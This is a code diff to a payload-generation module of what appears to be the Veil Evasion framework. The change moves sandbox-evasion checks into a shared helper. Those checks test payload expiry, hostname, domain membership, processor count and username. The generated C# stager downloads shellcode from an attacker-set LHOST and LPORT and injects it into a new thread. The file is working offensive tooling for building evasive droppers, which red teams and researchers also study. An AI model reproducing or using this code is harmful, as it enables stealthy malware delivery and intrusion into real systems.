@@ -10,6 +10,7 @@ Updated by @ChrisTruncer and @evan_pena2003
 
 from lib.common import helpers
 from Tools.Evasion.evasion_common import encryption
+from Tools.Evasion.evasion_common import gamemaker
 
 
 class PayloadModule:
@@ -111,57 +112,12 @@ class PayloadModule:
             payload_code += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
             payload_code += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)
 
-
         sName = helpers.randomString()
-        randomName = helpers.randomString()
         curlyCount = 0
         payload_code += "static void Main(){\n"
 
-        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
-
-            RandToday = helpers.randomString()
-            RandExpire = helpers.randomString()            
-
-            # Create Payload code
-            payload_code += '\t' * curlyCount + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
-            payload_code += '\t' * curlyCount + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, self.required_options["EXPIRE_PAYLOAD"][0])
-            payload_code += '\t' * curlyCount + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)
-
-            # Add a tab for this check
-            curlyCount += 1            
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":            
-
-            payload_code += '\t' * curlyCount + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(self.required_options["HOSTNAME"][0].lower())            
-
-            # Add a tab for this check
-            curlyCount += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            payload_code += '\t' * curlyCount + 'if (System.Environment.MachineName.ToLower() != System.Environment.UserDomainName.ToLower()) {\n'                        
-
-            # Add a tab for this check
-            curlyCount += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-
-            payload_code += '\t' * curlyCount + 'if (System.Environment.ProcessorCount > {}) {{\n'.format(self.required_options["PROCESSORS"][0])
-
-            # Add a tab for this check
-            curlyCount += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            rand_user_name = helpers.randomString()
-            rand_char_name = helpers.randomString()
-            
-            payload_code += '\t' * curlyCount + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
-            payload_code += '\t' * curlyCount + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
-            payload_code += '\t' * curlyCount + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, self.required_options["USERNAME"][0])            
-
-            # Add a tab for this check
-            curlyCount += 1
+        payload_code2, curlyCount = gamemaker.senecas_games(self)
+        payload_code = payload_code + payload_code2
 
         payload_code += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0])
         payload_code += "    %s(%s); }\n" %(injectName, sName)
